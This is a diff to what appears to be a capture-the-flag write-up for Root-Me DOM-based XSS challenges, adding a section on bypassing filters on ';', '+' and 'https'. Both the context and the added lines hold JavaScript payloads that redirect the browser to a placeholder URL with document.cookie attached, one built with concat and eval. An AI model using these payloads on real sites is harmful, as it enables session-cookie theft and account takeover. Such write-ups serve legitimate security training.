@@ -36,3 +36,10 @@ Submit URL in `Contact` page with param `RootmeURL?number='; window.location.hre
 This web use regex  /^\d+[\+|\-|\*|\/]\d+/ to check input. We can bypass by using the following input:
 
 ``1*24+";window.location.href=`URL?c=`+document.cookie;//"``
+
+### XSS DOM Based - Filters Bypass
+This web filters `;` or `+`. So we use `concat` instead.
+
+It also filters `https` to check redirect. 
+
+``'.concat(eval('document.location=`//URL?c=${document.cookie}`'))//``
